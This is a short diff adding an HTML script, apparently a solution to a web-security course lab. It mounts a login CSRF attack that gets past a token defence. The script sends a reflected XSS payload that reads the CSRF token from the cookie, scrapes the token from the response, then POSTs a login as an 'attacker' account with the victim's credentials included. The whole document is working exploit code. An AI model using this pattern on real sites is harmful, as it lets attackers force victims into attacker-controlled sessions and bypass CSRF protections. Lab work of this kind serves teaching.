@@ -1,0 +1,22 @@
+
+<script>
+    var req = new XMLHttpRequest();
+    req.open('get', 'http://cpsc4200.mpese.com/?csrfdefense=1&xssdefense=0&q=%3Cscript%3E$(document).ready(function(){var%20cookie=document.cookie;var%20realCookie=cookie.split(%22csrf_token=%22);var%20csrf_token=realCookie[1]; });%3C/script%3E', true);
+    req.send();
+    req.onload = function() {
+        var regex = /value='([a-zA-Z0-9]+)'/;
+        var match = req.responseText.match(regex);
+        var csrf_token = match[1];
+        console.log(req.responseText);
+        
+        
+    fetch("http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        credentials: "include",
+        body: "csrf_token="+csrf_token+"&username=attacker&password=l33th4x"
+    });
+    };
+</script>
